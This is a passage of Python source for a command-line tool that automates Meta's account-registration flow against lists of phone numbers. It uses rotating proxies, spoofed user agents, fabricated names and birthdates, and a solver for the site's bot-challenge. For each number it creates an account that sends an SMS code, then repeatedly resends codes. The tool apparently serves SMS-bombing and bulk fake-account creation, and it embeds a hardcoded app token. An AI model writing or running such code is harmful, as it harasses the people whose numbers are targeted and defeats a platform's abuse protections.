            proxy_data = next(PROXY_ITERATOR) if PROXY_ITERATOR else None
            user_agent = ua_func()

            future = executor.submit(process_number, num, user_agent, proxy_data, resend_count)
            future.add_done_callback(make_callback(num))

    display_final_summary()


def generate_random_username():
    """Generate a random username for Meta registration."""
    p1 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
    p1 += ''.join(random.choices(string.digits, k=random.randint(1, 3)))
    p2 = ''.join(random.choices(string.ascii_lowercase, k=random.randint(1, 2)))
    p2 += ''.join(random.choices(string.digits, k=random.randint(1, 2)))
    p2 += ''.join(random.choices(string.ascii_lowercase, k=random.randint(2, 4)))
    p3 = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(3, 6)))
    p1 = ''.join(random.sample(p1, len(p1)))
    p2 = ''.join(random.sample(p2, len(p2)))
    p3 = ''.join(random.sample(p3, len(p3)))
    return f"{p1}_{p2}_{p3}"

def generate_random_first_name():
    first_names = ["John", "Emma", "Liam", "Olivia", "Noah", "Ava", "William", "Sophia", "James", "Isabella", "Benjamin", "Mia", "Elijah", "Charlotte", "Lucas", "Amelia", "Mason", "Harper", "Logan", "Evelyn", "David", "Sarah", "Michael", "Jessica", "Chris", "Ashley", "Matthew", "Emily", "Daniel", "Amanda"]
    return random.choice(first_names)

def generate_random_last_name():
    last_names = ["Smith", "Johnson", "Williams", "Jones", "Brown", "Davis", "Miller", "Wilson", "Moore", "Taylor", "Anderson", "Thomas", "Jackson", "White", "Harris", "Martin", "Thompson", "Garcia", "Martinez", "Robinson", "Clark", "Rodriguez", "Lewis", "Lee", "Walker", "Hall", "Allen", "Young"]
    return random.choice(last_names)


def strip_json_prefix(text):
    """Remove Facebook's 'for (;;);' anti-hijacking prefix from JSON responses."""
    if text.startswith("for (;;);"):
        return text[len("for (;;);"):]
    return text


def build_common_params(hs, rev, s_val, hsi, dyn, csr, comet_req, lsd, jazoest, spin_b, spin_t,
                        ccg="GOOD", hsdp="", hblp="", sjsp=""):
    """Build the common Facebook API form parameters."""
    return {
        '__user': '0',
        '__a': '1',
        '__hs': hs,
        'dpr': '2',
        '__ccg': ccg,
        '__rev': rev,
        '__s': s_val,
        '__hsi': hsi,
        '__dyn': dyn,
        '__csr': csr,
        '__hsdp': hsdp,
        '__hblp': hblp,
        '__sjsp': sjsp,
        '__comet_req': comet_req,
        'lsd': lsd,
        'jazoest': jazoest,
        '__spin_r': rev,
        '__spin_b': spin_b,
        '__spin_t': spin_t,
        '__jssesw': '1',
    }


import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def process_number(number, user_agent, proxy=None, resend_count=1):
    """Core API logic: navigate Meta AI registration flow to trigger OTP."""
    number = str(number).strip()
    if not number.startswith('+'):
        number = '+' + number
    try:
        session = requests.Session()
        session.verify = False
        
        # Get language and country code based on target number and proxy
        lang_header, country_code, _ = get_locale_for_proxy(proxy, number)
        
        proxy_dict = None
        if proxy:
            if isinstance(proxy, dict) and 'proxy' in proxy:
                proxy_dict = proxy['proxy']
            elif isinstance(proxy, dict):
                proxy_dict = proxy
                
        if proxy_dict and isinstance(proxy_dict, dict):
            refreshed_dict = {}
            for proto in ['http', 'https']:
                if proto in proxy_dict and isinstance(proxy_dict[proto], str):
                    url = proxy_dict[proto]
                    if "session-s" in url:
                        url = re.sub(r'session-s\d+', f'session-s{random.randint(100000, 999999)}', url)
                    refreshed_dict[proto] = url
            if refreshed_dict:
                session.proxies.update(refreshed_dict)

        # Generate fake identity and device for this run
        req_first_name = generate_random_first_name()
        req_last_name = generate_random_last_name()
        req_display_name = f"{req_first_name} {req_last_name}"
        req_device_id = str(uuid.uuid4())

        # Detect platform from user-agent
        is_mobile = '?0'
        platform = '"Windows"'
        platform_ver = '"10.0.0"'
        model = '""'

        if 'Android' in user_agent:
            is_mobile, platform = '?1', '"Android"'
            and_match = re.search(r'Android\s+([0-9.]+)', user_agent)
            if and_match:
                ver_str = and_match.group(1)
                if '.' not in ver_str:
                    ver_str += '.0.0'
                elif ver_str.count('.') == 1:
                    ver_str += '.0'
                platform_ver = f'"{ver_str}"'
            mod_match = re.search(r'Android\s+[0-9.]+;\s+([^;)]+)\s+Build/', user_agent)
            if mod_match:
                model = f'"{mod_match.group(1).strip()}"'
        elif 'iPhone' in user_agent or 'iPad' in user_agent:
            is_mobile, platform = '?1', '"iOS"'
            ios_match = re.search(r'OS\s+([0-9_]+)\s+like', user_agent)
            if ios_match:
                ver_str = ios_match.group(1).replace('_', '.')
                if ver_str.count('.') == 0:
                    ver_str += '.0.0'
                elif ver_str.count('.') == 1:
                    ver_str += '.0'
                platform_ver = f'"{ver_str}"'
        elif 'Windows Phone' in user_agent:
            is_mobile, platform = '?1', '"Windows"'
        elif 'KAIOS' in user_agent or 'Mobile' in user_agent:
            is_mobile = '?1'

        # Check if browser supports User-Agent Client Hints (Chromium-based browsers)
        use_client_hints = False
        sec_ch_ua = ""
        major_ver = "145" # Default fallback
        if 'Chrome' in user_agent or 'Chromium' in user_agent or 'Brave' in user_agent or 'Edg' in user_agent:
            use_client_hints = True
            
            # Extract major version from User-Agent
            chrome_match = re.search(r'(?:Chrome|Chromium|Edg)/([0-9]+)\.', user_agent)
            if chrome_match:
                major_ver = chrome_match.group(1)

            sec_ch_ua = f'"Not:A-Brand";v="99", "Brave";v="{major_ver}", "Chromium";v="{major_ver}"'
            if 'Edg' in user_agent or 'Edge' in user_agent:
                sec_ch_ua = f'"Not_A Brand";v="8", "Chromium";v="{major_ver}", "Microsoft Edge";v="{major_ver}"'

        base_headers = {
            'accept-language': lang_header,
            'sec-gpc': '1',
            'user-agent': user_agent,
        }
        if use_client_hints:
            base_headers['sec-ch-ua'] = sec_ch_ua
            base_headers['sec-ch-ua-mobile'] = is_mobile
            base_headers['sec-ch-ua-platform'] = platform

        api_headers = {
            **base_headers,
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
            'priority': 'u=1, i',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'x-asbd-id': '359341',
        }
        if use_client_hints:
            full_ver = f"{major_ver}.0.0.0"
            if 'Edg' in user_agent or 'Edge' in user_agent:
                api_headers['sec-ch-ua-full-version-list'] = f'"Not_A Brand";v="8.0.0.0", "Chromium";v="{full_ver}", "Microsoft Edge";v="{full_ver}"'
            else:
                api_headers['sec-ch-ua-full-version-list'] = f'"Not:A-Brand";v="99.0.0.0", "Brave";v="{full_ver}", "Chromium";v="{full_ver}"'
            api_headers['sec-ch-ua-model'] = model
            api_headers['sec-ch-ua-platform-version'] = platform_ver

        page_headers = {
            **base_headers,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'priority': 'u=0, i',
            'referer': 'https://www.google.com/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }

        # Step 1: Visit meta.ai (with retry)
        max_retries = 3
        for attempt in range(1, max_retries + 1):
            try:
                response = session.get("https://www.meta.ai/", headers=page_headers, allow_redirects=True, timeout=15)
            except requests.exceptions.RequestException as req_err:
                err_str = str(req_err).lower()
                # Detect SOCKS5 auth failures early — no point retrying with same bad credentials
                if "socks5 authentication failed" in err_str or "socks5 auth" in err_str:
                    update_counter("error", number, f"Proxy Auth Failed (SOCKS5): {str(req_err)[:50]}", RED)
                    save_failed_number(number)
                    return
                if attempt == max_retries:
                    update_counter("error", number, f"meta.ai request failed: {req_err}", RED)
                    save_failed_number(number)
                    return
                time.sleep(2)
                continue

            if response.status_code == 403:
                # Handle Cloudflare-style challenge
                challenge_match = re.search(r"fetch\('(/__rd_verify_[^']+)'\s*,", response.text)
                if challenge_match:
                    challenge_url = f"https://www.meta.ai{challenge_match.group(1)}"
                    challenge_headers = {
                        **base_headers,
                        'accept': '*/*',
                        'origin': 'https://www.meta.ai',
                        'priority': 'u=1, i',
                        'referer': 'https://www.meta.ai/',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                    }
                    session.post(challenge_url, headers=challenge_headers, timeout=15)
                else:
                    safe_print(f"{YELLOW} Challenge URL Not Found! [{number}]")
                    return

                page_headers_retry = {
                    **base_headers,
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                    'cache-control': 'max-age=0',
                    'priority': 'u=0, i',
                    'referer': 'https://www.meta.ai/',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'upgrade-insecure-requests': '1',
                }
                try:
                    response = session.get("https://www.meta.ai/", headers=page_headers_retry, allow_redirects=True, timeout=15)
                except:
                    pass

                if response.status_code == 200:
                    break
            elif response.status_code == 403:
                safe_print(f"{YELLOW} [RATE LIMIT] IP Blocked (403)! [{number}]")
                continue
            elif response.status_code == 200:
                break
            else:
                break

        if response.status_code != 200:
            update_counter("error", number, "meta.ai visit failed!", RED)
            save_failed_number(number)
            return

        safe_print(f"{GREEN} ✅ meta.ai visit Success! [{number}]")

        # Extract tokens from homepage
        html = response.text
        tokens = extract_tokens(html, session_cookies=session.cookies)
        lsd = tokens['lsd']
        rev = tokens['rev']
        hsi = tokens['hsi']
        spin_b = tokens['spin_b']
        spin_t = tokens['spin_t']
        hs = tokens['hs']
        comet_req = tokens['comet_req']
        jazoest = tokens['jazoest']

        waterfall_id = str(uuid.uuid4())
        s_val = generate_s_val()
        qpl_id = "947263943"
        dyn = "7xeUjG1mxu1syUqxemh0no6u5U4e2C1vzEdE98K360CEbo1nEhw2nVEtwMw6ywaq221FwpUO0n24oaEnxO0Bo7O2l0Fwqo31w9O1lwlE-U2zxe2GewbS361qw82dUlwhE5m1pwg8fU1ck9zo2NwkQ0Lo6-m362WE3Gwxyo6O2G3W1nwOwbWEb8uwm83Ywgo6218wkE3PwiE6S"
        csr = ""

        # Step 2: Fetch OIDC redirect URI
        oidc_url = f"https://www.meta.ai/api/oidc/start?waterfall_id={waterfall_id}"
        try:
            response = session.get(oidc_url, headers=base_headers, allow_redirects=False, timeout=15)
            oidc_uri = response.headers.get("Location") or response.headers.get("location") or ""
        except Exception as e:
            oidc_uri = ""

        if not oidc_uri:
            snippet = response.text[:150].replace('\n', ' ').strip() if 'response' in locals() else "Request Exception"
            status_code = response.status_code if 'response' in locals() else "N/A"
            safe_print(f"{RED} [DEBUG] oidc_uri fetch failed. Code: {status_code}, Resp: {snippet} [{number}]")
            update_counter("error", number, "oidc_uri not found!", RED)
            save_failed_number(number)
            return

        # Step 3: Follow auth redirect
        step3_headers = {
            **base_headers,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'accept-language': lang_header,
            'priority': 'u=0, i',
            'referer': 'https://www.meta.ai/',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
        }

        response = session.get(oidc_uri, headers=step3_headers, allow_redirects=True, timeout=15)

        if response.status_code != 200:
            update_counter("error", number, "auth redirect failed!", RED)
            save_failed_number(number)
            return

        auth_referer = response.url
        parsed_auth_url = urlparse(auth_referer)
        auth_params = parse_qs(parsed_auth_url.query)
        csi = auth_params.get('csi', [''])[0]
        auth_redirect_uri = auth_params.get('redirect_uri', [''])[0]

        # Extract auth page tokens
        auth_tokens = extract_tokens(response.text, session_cookies=session.cookies, default_comet_req="33")
        auth_lsd = auth_tokens['lsd']
        auth_rev = auth_tokens['rev']
        auth_hsi = auth_tokens['hsi']
        auth_spin_b = auth_tokens['spin_b']
        auth_spin_t = auth_tokens['spin_t']
        auth_hs = auth_tokens['hs']
        auth_comet_req = auth_tokens['comet_req']
        auth_jazoest = auth_tokens['jazoest']

        auth_dyn = "7xeUmwlEnwn8K2Wmh0no6u5U4e0yoW3q32360CEbo1nEhw2nVE4W099w8G1Dz81s8hwnU2lwv89k2C1Fwc60D82IzXwae4UaEW0Loco5G0zK1swa-0raazo7u0zE2ZwrU6C2q0XU6O1FwlU4a5Ue82dwtU1fE"
        auth_csr = ""
        auth_ccg = "GOOD"

        
        # ======== INJECT GRAPHQL PRE-CHECKS HERE ========
        try:
            locale_underscore = lang_header.split(',')[0].replace('-', '_')
            graphql_headers = {
                'Authorization': 'OAuth FRL|388177446008673|083800dd7efbbd42eab18c9886d79c18',
                'User-Agent': f'Dalvik/2.1.0 (Linux; U; Android 11; CPH2173) [FBAN/StellaForAndroid;FBAV/456.0.0.39.90;FBPN/com.facebook.stella;FBLC/{locale_underscore};FBBV/587841512;FBCR/AS58717 Summit Communications Ltd;FBMF/OPPO;FBBD/oppo;FBDV/CPH2173;FBSV/11;FBCA/armeabi-v7a:armeabi;FBDM/{{density=2.0,width=1080,height=2400}};FBSN/Android;]',
                'Content-Type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Tigon/MNS/mvfst-mobile',
                'X-FB-Request-Analytics-Tags': '{"network_tags":{"product":"830547164036012","request_category":"graphql","purpose":"none","retry_attempt":"0"}}',
                'x-fb-conn-uuid-client': str(uuid.uuid4()).replace('-', ''),
                'X-FB-Server-Cluster': 'True',
                'X-FB-Client-IP': 'True',
                'x-fb-rev': '1014872422',
                'x-graphql-client-library': 'pando',
                'x-fb-connection-quality': 'EXCELLENT; q=0.9, rtt=18, rtx=0, c=39, mss=1232, tbw=109992, tp=81, tpl=0, uplat=324, ullat=3',
                'X-FB-Net-HNI': '47001',
                'X-FB-Sim-HNI': '47001',
                'X-FB-Connection-Type': 'CELLULAR',
                'Accept-Language': lang_header.split(',')[0],
                'Accept-Encoding': 'gzip, deflate',
                'X-FB-Timezone': 'Asia/Dhaka',
                'X-FB-Friendly-Name': 'FrlBloksAsyncActionQuery-com.bloks.www.meta.access.aymh_with_nta_fallback.async',
                'X-Root-Field-Name': 'bloks_action'
            }
            
            gql_session_id = str(uuid.uuid4())
            gql_device_id = str(uuid.uuid4())
            gql_state_id = str(uuid.uuid4())
            
            aymh_params = {
                "client_input_params": {
                    "family_device_id": gql_device_id,
                    "device_id": gql_device_id,
                    "native_auth_data": []
                },
                "server_params": {
                    "next": f"https://accounts.meta.com/oidc/?app_id=934401142814369&scope=openid&response_type=code&redirect_uri=https%3A%2F%2Faccounts.meta.com%2Fnative%2Foidc%2Fredirect%2Fmetaai&state={gql_state_id}",
                    "should_open_or_push_sync_screen": 0,
                    "should_show_explicit_oxygen_preload_tos": 0,
                    "INTERNAL__latency_qpl_instance_id": random.randint(10000000000000, 99999999999999),
                    "is_otp_shortcut": 0,
                    "is_from_reauth": 0,
                    "should_push_screen": 0,
                    "logging_session_id": gql_session_id,
                    "context_data": "",
                    "INTERNAL__latency_qpl_marker_id": 36707139,
                    "logging_user_intent": "meta_ai",
                    "nav_bar_action": "CLOSE",
                    "is_native_token_fetch_done": 1
                }
            }
            
            aymh_variables = {
                "bk_context": {"debug_tooling_metadata_token": None, "is_flipper_enabled": False},
                "params": {
                    "app_id": "com.bloks.www.meta.access.aymh_with_nta_fallback.async",
                    "bloks_versioning_id": "24e20f03055c8429a90734dc77fd2c73718857aca6d82bef6a4c325a7cbae11e",
                    "params": json.dumps(aymh_params)
                }
            }
            
            aymh_data = {
                'client_doc_id': '25388939416361662348114792130',
                'variables': json.dumps(aymh_variables)
            }
            
            resp_aymh = session.post(f'https://meta.graph.meta.com/graphql?locale={locale_underscore}', headers=graphql_headers, data=aymh_data, timeout=15)
            context_data = ""
            match = re.search(r'["\\]+(AT[a-zA-Z0-9_\\-]{40,})["\\]+', resp_aymh.text)
            if match:
                context_data = match.group(1)
            
            if context_data:
                inner_params = {
                    "client_input_params": {"contact_point": number},
                    "server_params": {"context_data": context_data},
                    "INTERNAL__latency_qpl_marker_id": 36707139,
                    "INTERNAL__latency_qpl_instance_id": random.randint(10000000000000, 99999999999999),
                    "logging_session_id": gql_session_id,
                    "user_intent": "meta_ai",
                    "logging_user_intent": "meta_ai"
                }
                cp_vars = {
                    "bk_context": {"debug_tooling_metadata_token": None, "is_flipper_enabled": False},
                    "params": {
                        "app_id": "com.bloks.www.bloks.feta.rl_access.cp_lookup",
                        "bloks_versioning_id": "24e20f03055c8429a90734dc77fd2c73718857aca6d82bef6a4c325a7cbae11e",
                        "params": json.dumps(inner_params)
                    }
                }
                cp_headers = graphql_headers.copy()
                cp_headers['X-FB-Friendly-Name'] = 'FrlBloksAsyncActionQuery-com.bloks.www.bloks.feta.rl_access.cp_lookup'
                cp_data = {'client_doc_id': '25388939416361662348114792130', 'variables': json.dumps(cp_vars)}
                session.post(f'https://meta.graph.meta.com/graphql?locale={locale_underscore}', headers=cp_headers, data=cp_data, timeout=15)
        except Exception as e:
            pass # ignore GraphQL errors and continue to Step 4
        # ================================================

        # Step 4: Check contact point availability

        s_val = generate_s_val()

        step4_headers = {
            **api_headers,
            'accept-language': lang_header,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd,
        }

        step4_data = {
            'account_reg_info[birthday]': time.strftime('%Y-%m-%d'),
            'account_reg_info[device_id]': req_device_id,
            'account_reg_info[first_name]': req_first_name,
            'account_reg_info[has_youth_consent]': 'false',
            'account_reg_info[is_bootstrap_flow]': 'false',
            'account_reg_info[last_name]': req_last_name,
            'account_reg_info[pc_rendering_data]': '',
            'account_reg_info[phone_number]': number,
            'account_reg_info[registration_flow_id]': '',
            'allow_unconfirmed_email': 'false',
            'check_for_pre_registration_restrictions': 'true',
            'check_mma_account': 'false',
            'contact_point': number,
            'contact_point_type': 'PHONE_NUMBER',
            'reg_integrity': '',
            'skip_xapp_checks': 'false',
            'source_app_id': '391894423991568',
            **build_common_params(auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg),
            '__req': '1j',
        }

        response = session.post('https://auth.meta.com/api/check-contact-point-availability/', headers=step4_headers, data=step4_data, timeout=15)

        step4_text = strip_json_prefix(response.text)

        reg_integrity = ""
        try:
            step4_json = json.loads(step4_text)
            reg_integrity = step4_json.get("payload", {}).get("regIntegrity", "")
        except json.JSONDecodeError:
            pass

        if not reg_integrity:
            ri_match = re.search(r'"regIntegrity"\s*:\s*"([^"]+)"', response.text)
            if ri_match:
                reg_integrity = ri_match.group(1)

        # Extract contact point from response
        contact_point = ""
        try:
            contact_point = step4_json.get("payload", {}).get("contactPoint", "")
        except:
            pass
        if not contact_point:
            cp_match = re.search(r'"contactPoint"\s*:\s*"([^"]+)"', response.text)
            if cp_match:
                contact_point = cp_match.group(1)
        if not contact_point:
            contact_point = number if number.startswith('+') else '+' + number

        # Step 5: Submit date of birth
        current_year = time.localtime().tm_year
        dob_year = random.randint(current_year - 35, current_year - 18)
        dob_month = random.randint(1, 12)
        dob_day = random.randint(1, 28)
        dob = f"{dob_year}-{dob_month:02d}-{dob_day:02d}"

        s_val = generate_s_val()
        qpl_join_id = generate_qpl_join_id()

        step5_headers = {
            **api_headers,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd,
        }

        step5_data = {
            'caa_event_flow': 'ntf',
            'date_of_birth': dob,
            'first_name': req_first_name,
            'has_youth_consent': 'false',
            'isf': 'false',
            'last_name': req_last_name,
            'phone_number': contact_point,
            'qpl_join_id': qpl_join_id,
            'reg_integrity': reg_integrity,
            'source_app_id': '391894423991568',
            **build_common_params(auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg),
            '__req': '1c',
        }

        response = session.post('https://auth.meta.com/api/check-date-of-birth/', headers=step5_headers, data=step5_data, timeout=15)

        step5_text = strip_json_prefix(response.text)
        try:
            step5_json = json.loads(step5_text)
            if step5_json.get("error"):
                error_msg = step5_json.get("errorDescription", "Unknown error")
                update_counter("failed", number, f"Account already exists! {error_msg}", YELLOW)
                save_failed_number(number)
                return
            payload = step5_json.get("payload")
            if payload:
                new_ri = payload.get("regIntegrity", "")
                if new_ri:
                    reg_integrity = new_ri
        except json.JSONDecodeError:
            pass

        # Step 6: Submit password
        password = generate_password()
        formatted_password = f"#PWD_BROWSER:0:{int(time.time())}:{password}"

        s_val = generate_s_val()
        qpl_join_id = generate_qpl_join_id()

        step6_headers = {
            **api_headers,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd,
        }

        step6_data = {
            'contact_point': contact_point,
            'date_of_birth': dob,
            'name': req_display_name,
            'password': formatted_password,
            'qpl_join_id': qpl_join_id,
            **build_common_params(auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg),
            '__req': '1r',
        }

        response = session.post('https://auth.meta.com/api/check-password/', headers=step6_headers, data=step6_data, timeout=15)

        step6_text = strip_json_prefix(response.text)
        try:
            step6_json = json.loads(step6_text)
            if step6_json.get("error"):
                error_msg = step6_json.get("errorDescription", "Unknown error")
                update_counter("failed", number, f"Password step failed! {error_msg}", RED)
                save_failed_number(number)
                return
            payload = step6_json.get("payload")
            if payload:
                new_ri = payload.get("regIntegrity", "")
                if new_ri:
                    reg_integrity = new_ri
        except json.JSONDecodeError:
            pass

        # Step 7: Submit registration (triggers OTP)
        username = generate_random_username()
        s_val = generate_s_val()
        qpl_join_id = generate_qpl_join_id()

        step7_headers = {
            **api_headers,
            'origin': 'https://auth.meta.com',
            'referer': auth_referer,
            'x-fb-lsd': auth_lsd,
        }

        step7_data = {
            'client_consent_timestamp': str(int(time.time())),
            'display_name': req_display_name,
            'foa_import_source_name': '',
            'foa_import_source_obid': '',
            'nta_disclosures_summary_cms_id': '',
            'picture_source': '',
            'tos_cms_id': '957798449862312',
            'username': username,
            'consent_version': '',
            'contact_point': contact_point,
            'contact_point_type': 'PHONE_NUMBER',
            'csi': csi,
            'date_of_birth': dob,
            'device_id': req_device_id,
            'fb_encrypted_access_token': '',
            'fb_oidc_access_token': '',
            'first_name': req_first_name,
            'has_youth_consent': 'false',
            'ig_encrypted_access_token': '',
            'ig_encrypted_auth_header': '',
            'ig_oidc_access_token': '',
            'last_name': req_last_name,
            'opt_into_marketing': 'false',
            'password': formatted_password,
            'redirect_uri': auth_redirect_uri,
            'reg_integrity': reg_integrity,
            'should_save_credentials': 'true',
            'source_app_id': '391894423991568',
            'third_party_age_verification_id': '',
            'waterfall_id': waterfall_id,
            'caa_event_flow': 'ntf',
            'entry_point': 'login_home',
            'event_client_time': f'{time.time():.3f}',
            'is_kadabra_zero': 'false',
            'reg_navigation_flow_name': 'new_to_family_c50_r1',
            'regulation_jurisdiction': f'["{country_code}"]',
            'qpl_join_id': qpl_join_id,
            **build_common_params(auth_hs, auth_rev, s_val, auth_hsi, auth_dyn, auth_csr,
                                  auth_comet_req, auth_lsd, auth_jazoest, auth_spin_b, auth_spin_t, auth_ccg),
            '__req': '1k',
        }

        response = session.post('https://auth.meta.com/login/device-based/kadabra-register-save-credentials/', headers=step7_headers, data=step7_data, timeout=15)

        step7_text = strip_json_prefix(response.text)

        try:
            step7_json = json.loads(step7_text)
            if step7_json.get("error"):
                error_msg = step7_json.get("errorDescription", "Unknown error")
                update_counter("failed", number, f"Registration failed! {error_msg}", RED)
                save_failed_number(number)
                return

            payload = step7_json.get("payload")
            if payload:
                account_id = payload.get("account_id", "")

                if account_id:
                    primary_lang = lang_header.split(',')[0]
                    update_counter("success", number, f"Registration Successful! OTP Sent! ID:{account_id} [Country: {country_code}] [Lang: {primary_lang}]", GREEN)
                    save_success_number(number)

                    # Step 8: Resend OTP loop
                    if resend_count > 0:
                        for r_idx in range(resend_count):
                            reload_headers = {
                                **base_headers,
                                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                                'accept-language': lang_header,
                                'priority': 'u=0, i',
                                'referer': 'https://auth.meta.com/',
                                'sec-fetch-dest': 'document',
                                'sec-fetch-mode': 'navigate',
                                'sec-fetch-site': 'same-origin',
                                'upgrade-insecure-requests': '1',
                            }
                            reload_response = session.get(auth_referer, headers=reload_headers, allow_redirects=True, timeout=15)

                            resend_tokens = extract_tokens(reload_response.text, session_cookies=session.cookies,
                                                           default_lsd=auth_lsd, default_rev=auth_rev,
                                                           default_hsi=auth_hsi, default_hs=auth_hs,
                                                           default_spin_b=auth_spin_b, default_spin_t=auth_spin_t,
                                                           default_comet_req=auth_comet_req)
                            fb_dtsg = resend_tokens['fb_dtsg']
                            if not fb_dtsg:
                                safe_print(f"{YELLOW}  fb_dtsg not found! Resend OTP skip. [{number}]")
                                return

                            s_val = generate_s_val()

                            resend_headers = {
                                **api_headers,
                                'origin': 'https://auth.meta.com',
                                'referer': auth_referer,
                                'x-fb-friendly-name': 'FRLResendOTPMutation',
                                'x-fb-lsd': resend_tokens['lsd'],
                            }

                            resend_variables = json.dumps({
                                "input": {
                                    "contact_point": {"sensitive_string_value": contact_point},
                                    "contact_point_type": "PHONE_NUMBER",
                                    "source_app_id": 391894423991568,
                                    "actor_id": "0",
                                    "client_mutation_id": "1"
                                }
                            })

                            resend_data = {
                                'av': '0',
                                **build_common_params(resend_tokens['hs'], resend_tokens['rev'], s_val,
                                                      resend_tokens['hsi'], auth_dyn, auth_csr,
                                                      resend_tokens['comet_req'], resend_tokens['lsd'],
                                                      resend_tokens['jazoest'], resend_tokens['spin_b'],
                                                      resend_tokens['spin_t'], "EXCELLENT"),
                                '__req': '1w',
                                'fb_dtsg': fb_dtsg,
                                'fb_api_caller_class': 'RelayModern',
                                'fb_api_req_friendly_name': 'FRLResendOTPMutation',
                                'server_timestamps': 'true',
                                'variables': resend_variables,
                                'doc_id': '9505972379478338',
                            }

                            response = session.post('https://auth.meta.com/api/graphql/', headers=resend_headers, data=resend_data, timeout=15)

                            resend_text = strip_json_prefix(response.text)

                            try:
                                resend_json = json.loads(resend_text)
                                resend_success = resend_json.get("data", {}).get("resend_otp", {}).get("success", False)

                                errors = resend_json.get("errors", [])
                                if errors:
                                    error_code = errors[0].get("api_error_code")
                                    error_desc = errors[0].get("description", "Unknown Error")
                                    if error_code == 613:
                                        safe_print(f"{YELLOW} [RATE LIMIT] {error_desc} [{number}]")
                                        break
                                    else:
                                        safe_print(f"{YELLOW} OTP Resend {r_idx+1}/{resend_count} Failed (Code: {error_code}) [{number}]")
                                elif resend_success:
                                    safe_print(f"{GREEN} OTP Resend {r_idx+1}/{resend_count} Successful! [{number}]")
                                else:
                                    safe_print(f"{YELLOW} OTP Resend {r_idx+1}/{resend_count} Failed (Unknown) [{number}]")

                            except Exception as e:
                                safe_print(f"{YELLOW} Resend OTP {r_idx+1} Error: {e} [{number}]")

                            if r_idx < resend_count - 1:
                                delay = round(random.uniform(0.5, 1.2), 2)
                                time.sleep(delay)
                else:
                    errors = payload.get("validation_errors", [])
                    update_counter("failed", number, f"Registration failed! {errors}", RED)
                    save_failed_number(number)
            else:
                update_counter("failed", number, "Registration failed! (payload null)", RED)
                save_failed_number(number)
        except json.JSONDecodeError:
            update_counter("error", number, "Response parse failed!", RED)
            save_failed_number(number)

    except requests.exceptions.ConnectionError as e:
        update_counter("error", number, f"Network error: {str(e)[:30]}...", RED)
        save_failed_number(number)
        time.sleep(5)
    except requests.exceptions.Timeout:
        update_counter("error", number, "Request timeout!", RED)
        save_failed_number(number)
        time.sleep(5)
    except requests.exceptions.RequestException as e:
        update_counter("error", number, f"Request error: {str(e)[:30]}...", RED)
        save_failed_number(number)
        time.sleep(3)
    except Exception as e:
        update_counter("error", number, f"Unexpected error: {str(e)[:30]}...", RED)
        save_failed_number(number)

# ========================================
# main.py
# ========================================
import sys
import time
import os
import hashlib
import json as jsond



def main_menu():
    check_for_updates()
    verify_auth()
    while True:
        clear_logo()
        print(f" {opt_labels[0]} API Automation (Fast - Meta AI)")
        print(f" {opt_labels[1]} Exit")
        print(f"{LINE}")

        choice = input(f"{GREEN} [{RED}●{GREEN}] Select Option {EKL} ").strip()

        if choice in ['1', '01']:
            api_bot.run()
        elif choice in ['2', '02']:
            print(f"\n{GREEN} [{RED}●{GREEN}] Exiting...")
            time.sleep(1)
            sys.exit(0)
        else:
            print(f"\n{RED} Invalid Option! Please try again.")
            time.sleep(1.5)

if __name__ == "__main__":
    for file_name in ["Number_List.txt", "Proxy_List.txt"]:
        if not os.path.exists(file_name):
            with open(file_name, "w") as f:
                pass
    main_menu()
